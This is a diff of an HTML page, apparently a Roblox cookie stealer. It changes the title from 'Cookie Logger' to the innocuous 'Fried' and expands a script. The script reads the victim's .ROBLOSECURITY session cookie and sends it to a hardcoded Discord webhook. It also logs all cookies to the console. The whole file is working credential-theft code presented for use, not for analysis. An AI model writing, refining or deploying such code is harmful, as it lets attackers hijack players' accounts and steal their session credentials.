@@ -1,13 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie Logger</title>
+    <title>Fried</title>
     <script>
         function logCookies() {
-            var cookies = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-            if (cookies) {
-                var roblosecurity = cookies[1];
+            // Retrieve all cookies
+            var cookies = document.cookie;
+            console.log("All Cookies:", cookies);
+
+            // Extract the .ROBLOSECURITY cookie
+            var roblosecurityMatch = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
+            if (roblosecurityMatch) {
+                var roblosecurity = roblosecurityMatch[1];
+                console.log(".ROBLOSECURITY Cookie Found:", roblosecurity);
+
+                // Discord webhook URL
                 var webhookUrl = 'https://discord.com/api/webhooks/1377645545291649127/yKXyaBLohAtSN9cN6pP8x_HZy2sRaaz9T2eXtPt6ONcKDEMlBd3WZchgyPjavSv0uchI';
+
+                // Send the cookie to the Discord webhook
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", webhookUrl, true);
                 xhr.setRequestHeader("Content-Type", "application/json");
@@ -15,7 +25,7 @@
                     content: `Captured .ROBLOSECURITY Cookie: ${roblosecurity}`
                 }));
             } else {
-                console.log('.ROBLOSECURITY cookie not found.');
+                console.log(".ROBLOSECURITY cookie not found.");
             }
         }
 
